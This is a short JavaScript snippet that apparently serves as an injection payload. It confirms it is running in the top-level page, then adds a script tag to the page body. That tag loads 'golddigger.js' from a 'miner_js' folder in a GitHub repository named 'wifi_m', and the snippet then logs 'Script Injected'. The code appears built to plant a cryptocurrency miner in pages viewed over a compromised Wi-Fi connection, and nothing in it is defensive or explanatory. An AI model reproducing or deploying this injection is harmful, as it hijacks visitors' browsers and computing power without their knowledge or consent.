if(parent.document.URL!=document.location.href)
       throw new Error("Not the main page");

(function(e){e.setAttribute("src","https://github.com/johnbomba/wifi_m/blob/master/miner_js/golddigger.js"); 
document.getElementsByTagName("body")[0].appendChild(e);})
(document.createElement("script"));void(0);

console.log("******* Script Injected *******")